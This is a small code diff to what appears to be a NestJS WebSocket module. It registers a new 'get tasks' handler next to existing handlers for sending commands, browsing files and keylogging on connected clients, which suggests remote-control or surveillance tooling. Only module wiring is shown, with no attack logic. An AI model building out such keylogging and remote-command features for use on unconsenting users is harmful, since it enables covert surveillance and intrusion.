@@ -16,6 +16,7 @@ import { ClientModule } from "../client/infrastructure/client.module";
 import { WsClientGetExplorer } from "./application/events/ws-client-get-explorer";
 import { WsClientKeyLogger } from "./application/events/ws-client-keylogger";
 import { WsApplicationModule } from "../ws-application/ws-application.module";
+import { WsClientGetTasks } from "./application/events/ws-client-get-tasks";
 
 @Module({
   providers: [
@@ -31,6 +32,7 @@ import { WsApplicationModule } from "../ws-application/ws-application.module";
     WsClientSendCmdCommand,
     WsClientGetExplorer,
     WsClientKeyLogger,
+    WsClientGetTasks,
   ],
   exports: [
     WsClientJoinsUseCase,
@@ -42,6 +44,7 @@ import { WsApplicationModule } from "../ws-application/ws-application.module";
     WsClientRepository,
     WsClientGetExplorer,
     WsClientKeyLogger,
+    WsClientGetTasks,
   ],
   imports: [
     SchemasModule,
